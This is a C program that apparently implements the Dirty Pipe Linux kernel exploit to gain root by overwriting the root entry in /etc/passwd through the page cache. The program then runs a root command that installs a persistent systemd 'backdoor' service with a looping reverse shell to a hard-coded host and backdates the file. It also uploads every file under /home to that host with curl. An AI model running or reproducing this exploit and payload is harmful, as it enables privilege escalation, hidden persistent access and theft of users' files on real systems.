#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main() {

    // Exploit for priviledge escalation
    const char *const path = "/etc/passwd";

    FILE *f1 = fopen("/etc/passwd", "r");
    FILE *f2 = fopen("/tmp/passwd.bak", "w");

    if (f1 == NULL) {
        exit(EXIT_FAILURE);
    } else if (f2 == NULL) {
        fclose(f1);
        exit(EXIT_FAILURE);
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);

	loff_t offset = 4; // after the "root"
	const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped 
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		return EXIT_FAILURE;
	}

    char *LHOST = "10.0.2.15";
    char *LPORT = "9001";
    char *SPORT = "8000";
    
    char *cmd = "(echo piped; cat) | su - -c \"cp /tmp/passwd.bak /etc/passwd;echo '[Service]\nType=simple\nUser=root\nRestart=on-failure\nRestartSec=5s\nExecStart=/bin/bash -c \\\"while [ 1 ]; do bash -i >& /dev/tcp/%s/%s 0>&1; done\\\"\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service;touch -t 202202230836 /etc/systemd/system/backdoor.service;sudo systemctl enable backdoor --now; find /home/ -not -path '*/\.*' -name '*' -type f -exec curl -s -T {} http://%s:%s/ \\; > /dev/null; /bin/sh\" root &";
    
    char buffer[strlen(cmd) + 20];
    
    sprintf(buffer, cmd, LHOST, LPORT, LHOST, SPORT);

    char *argv[] = {"/bin/sh", "-c", buffer};
    
    execv("/bin/sh", argv);
    printf("system() function call seems to have failed :(\n");
	    return EXIT_SUCCESS;
}
